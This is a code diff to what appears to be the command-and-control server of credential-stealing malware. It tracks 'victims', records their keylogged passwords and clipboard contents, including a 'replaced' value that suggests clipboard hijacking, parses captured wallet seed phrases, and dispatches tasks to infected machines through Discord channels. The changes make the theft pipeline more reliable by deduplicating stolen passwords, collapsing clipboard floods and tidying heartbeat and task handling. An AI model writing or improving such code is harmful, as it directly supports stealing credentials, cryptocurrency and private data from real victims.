@@ -296,8 +296,6 @@ async function ensureLinks(): Promise<void> {
         include: { discord: true }
       });
       fresh = true;
-    } else {
-      await prisma.victim.update({ where: { id: victim.id }, data: { lastHeartbeatAt: new Date(), status: 'online' } }).catch(() => undefined);
     }
     if (victim.discord && liveIds.has(victim.discord.channelId) && victim.discord.channelId !== channel.id) {
       // The victim already has a live channel; this is a second sync- channel.
@@ -368,7 +366,11 @@ async function send(link: { id: string; channelId: string; webhookUrl: string | 
 
 async function handleMessage(link: { channelId: string; victimId: string }, message: Message): Promise<void> {
   if (!outbound.has(message.id)) {
-    await prisma.victim.update({ where: { id: link.victimId }, data: { lastHeartbeatAt: new Date(), status: 'online' } }).catch(() => undefined);
+    // Bridge traffic is not a heartbeat: a dead agent must go stale at 90 s.
+    await prisma.victim.update({
+      where: { id: link.victimId },
+      data: { lastAgentMessageAt: new Date(), status: 'online' }
+    }).catch(() => undefined);
   }
 
   const embed = message.embeds?.find((item) => item.title === 'Fabric Sync');
@@ -425,6 +427,42 @@ function norm(value: string): string {
   return value.replace(/\s+/g, ' ').trim().slice(0, 4000);
 }
 
+/** One password row per process+title inside five minutes, with a counter. */
+async function recordPassword(victimId: string, process: string, title: string, text: string): Promise<void> {
+  const since = new Date(Date.now() - 5 * 60_000);
+  const existing = await prisma.keylog.findFirst({
+    where: { victimId, process, title, password: true, updatedAt: { gte: since } },
+    orderBy: { updatedAt: 'desc' }
+  }).catch(() => null);
+  if (existing) {
+    await prisma.keylog.update({
+      where: { id: existing.id },
+      data: { text, ts: new Date(), updatedAt: new Date(), count: { increment: 1 } }
+    }).catch(() => undefined);
+    return;
+  }
+  await prisma.keylog.create({ data: { victimId, process, title, text, password: true } });
+}
+
+/** Clipboard floods collapse onto one row per kind+content inside a minute. */
+async function recordClipboard(victimId: string, kind: string, content: string, replaced: string | null): Promise<void> {
+  const since = new Date(Date.now() - 60_000);
+  const existing = content
+    ? await prisma.clipboardEntry.findFirst({
+      where: { victimId, kind, content, updatedAt: { gte: since } },
+      orderBy: { updatedAt: 'desc' }
+    }).catch(() => null)
+    : null;
+  if (existing) {
+    await prisma.clipboardEntry.update({
+      where: { id: existing.id },
+      data: { replaced, ts: new Date(), updatedAt: new Date(), count: { increment: 1 } }
+    }).catch(() => undefined);
+    return;
+  }
+  await prisma.clipboardEntry.create({ data: { victimId, ts: new Date(), process: '', window: '', content, kind, replaced } });
+}
+
 async function handleText(victimId: string, message: Message): Promise<void> {
   const content = message.content.trim();
   if (!content) return;
@@ -440,7 +478,7 @@ async function handleText(victimId: string, message: Message): Promise<void> {
   }
   if (content.startsWith('password?')) {
     const [proc, title, ...rest] = content.slice(10).split('|');
-    await prisma.keylog.create({ data: { victimId, process: (proc ?? '').trim(), title: (title ?? '').trim(), text: rest.join('|').trim(), password: true } });
+    await recordPassword(victimId, (proc ?? '').trim(), (title ?? '').trim(), rest.join('|').trim());
     return;
   }
   if (/^seed escrita:/i.test(content)) {
@@ -472,11 +510,14 @@ async function handleText(victimId: string, message: Message): Promise<void> {
     const space = before.indexOf(' ');
     const kind = space > 0 ? before.slice(0, space) : 'text';
     const original = space > 0 ? before.slice(space + 1) : before;
-    await prisma.clipboardEntry.create({ data: { victimId, ts: new Date(), process: '', window: '', content: original, kind, replaced } });
+    await recordClipboard(victimId, kind, original, replaced);
     return;
   }
   if (content.startsWith('Failed:')) {
-    await prisma.task.updateMany({ where: { victimId, status: 'running', discordMessageId: { not: null } }, data: { status: 'error', error: norm(content), finishedAt: new Date(), leaseUntil: null } });
+    await prisma.task.updateMany({
+      where: { victimId, status: 'running', discordMessageId: { not: null } },
+      data: { status: 'error', error: norm(content), finishedAt: new Date(), leaseUntil: null }
+    });
     return;
   }
   if (pendingSeed.has(victimId) && Date.now() - (pendingSeed.get(victimId) ?? 0) < 10_000) {
@@ -653,6 +694,14 @@ async function closeTaskFromResult(
 
 async function dispatchTasks(): Promise<void> {
   const now = new Date();
+  const ignored = new Set((await prisma.discordIgnore.findMany({ select: { channelId: true } })).map((row) => row.channelId));
+  const ignoredIds = Array.from(ignored);
+  if (ignoredIds.length > 0) {
+    await prisma.task.updateMany({
+      where: { status: 'queued', victim: { discord: { channelId: { in: ignoredIds } } } },
+      data: { status: 'error', error: 'discord_unlinked: channel is ignored; re-link the victim', finishedAt: now, leaseUntil: null }
+    });
+  }
   await prisma.task.updateMany({
     where: { status: 'queued', victim: { discord: { is: null } } },
     data: { status: 'error', error: 'discord_unlinked: victim has no Discord channel', finishedAt: now, leaseUntil: null }
